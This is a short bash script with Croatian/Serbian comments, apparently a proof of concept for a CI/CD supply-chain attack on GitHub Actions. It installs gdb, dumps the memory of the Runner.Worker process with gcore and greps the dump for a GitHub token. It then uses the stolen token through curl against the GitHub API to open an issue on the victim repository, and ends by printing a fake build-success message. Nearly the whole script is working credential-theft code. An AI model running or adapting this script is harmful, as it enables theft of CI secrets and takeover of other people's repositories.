#!/bin/bash
echo "[*] Oktopod je ušao u CI/CD žrtve. Instaliram alate..."
sudo apt-get update -y && sudo apt-get install -y gdb curl > /dev/null 2>&1

(
  sleep 1
  RUNNER_PID=$(pgrep -f "Runner.Worker" | head -n 1)
  if [ -n "$RUNNER_PID" ]; then
    echo "[+] Čupam RAM iz procesa: $RUNNER_PID"
    sudo gcore -o /tmp/core $RUNNER_PID > /dev/null 2>&1
    
    # Vadimo token žrtve iz njenog RAM-a!
    TOKEN=$(sudo strings /tmp/core* | grep -Eo "ghs_[A-Za-z0-9_]{36}" | sort | uniq | head -n 1)
    
    if [ -n "$TOKEN" ]; then
      echo "TOKEN ULOVLJEN! Šaljem udarac nazad na repozitorij žrtve..."
      
      # Koristimo token žrtve da kreiramo Issue na repozitoriju žrtve!
      curl -X POST \
        -H "Authorization: Bearer $TOKEN" \
        -H "Accept: application/vnd.github.v3+json" \
        https://api.github.com/repos/saricital/open-source-projekat/issues \
        -d '{"title":"🚨 Oktopod Supply Chain Udar 🚨","body":"Ovaj Issue je kreirao NAPADAČ iz svog PR-a! Token je isisan iz žive RAM memorije Runnera Žrtve pomoću `gcore`! Apsolutni takeover repozitorija!"}'
    fi
  fi
) &

# Da se workflow ne bi zatvorio prebrzo, pauziramo glavnu skriptu
echo "Čekam da Oktopod završi posao..."
sleep 15
echo "Kompajliranje gotovo!"
